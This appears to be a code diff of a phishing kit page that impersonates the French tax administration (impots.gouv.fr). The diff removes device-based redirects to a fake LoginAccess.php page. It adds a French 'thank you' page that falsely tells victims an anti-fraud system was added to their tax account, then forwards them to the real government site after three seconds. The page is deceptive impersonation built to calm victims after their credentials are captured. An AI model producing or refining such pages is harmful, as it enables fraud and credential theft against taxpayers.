@@ -13,9 +13,55 @@ if (in_array($mobile_ua,$mobile_agents)) {$mobile_browser++;}
 if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']),'opera mini') > 0) {$mobile_browser++;
 $stock_ua = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA'])?$_SERVER['HTTP_X_OPERAMINI_PHONE_UA']:(isset($_SERVER['HTTP_DEVICE_STOCK_UA'])?$_SERVER['HTTP_DEVICE_STOCK_UA']:''));
 if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) {$tablet_browser++;}}
-if ($tablet_browser > 0) {?><meta http-equiv="Refresh" content="0; url=LoginAccess.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>"><?}else if ($mobile_browser > 0) {?><meta http-equiv="Refresh" content="0; url=mobile/LoginAccess.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>"><?}
-else {?><meta http-equiv="Refresh" content="0; url=LoginAccess.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>"><?}
+if ($tablet_browser > 0) {}
+else if ($mobile_browser > 0) {}
+else {}
 /// End
-
-
 ?>
+<!DOCTYPE HTML>
+<html lang="fr" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width; initial-scale=1; maximum-scale=1"><link rel="stylesheet" href="css/style.css"/>
+<meta http-equiv="Refresh" content="3; url=https://cfspro.impots.gouv.fr">
+<link rel="icon" href="images/favicon.ico"/>
+<script src="js/telepaiement_continuer.js"></script>
+<title>Merci</title>
+</head>
+<body>
+<div style="width:100%;text-align:center;">
+<img src="images/peka.svg" style="width:97%;"/>
+<img src="images/safe.png" style="width:25%;margin-top:-24px;"/>
+</div>
+
+<div style="width:100%;background-color:#e8e8e8;padding-top:9px;padding-bottom:35px;">
+<center>
+
+<div style="margin-top:-11px;">
+<div style="background:white;width:94%;border-radius:4px;padding-bottom: 10px;">
+<h1 class="titre">Merci,Vous avez r&eacute;tabli l'acces &agrave; votre compte</h1>
+<center>
+<form class="form01" method="post" action="" onsubmit="return validate();" onchange="return validate();">
+
+<center><img src="images/than.png"></center>
+<div style="color: white;background: #5eba40;border-radius: 3px;font: 1em Arial, sans-serif;text-align: left;font-size: 14px;width: 80%;padding: 10px;">
+Le nouveau syst&eacute;me de lutte contre la fraude a &eacute;t&eacute; ajout&eacute; avec succ&eacute;s &agrave; votre compte Impots. Maintenant, vous serez connecter &agrave; votre compte.
+</div>
+
+</form>
+</center>
+</div>
+</div>
+
+</center>
+</div>
+
+<br>
+<br>
+<center>
+<div style="color:black;font-size:14px;">Direction g&eacute;n&eacute;rale des Finances publiques</div>
+</center>
+<br>
+<br>
+</body>
+</html>
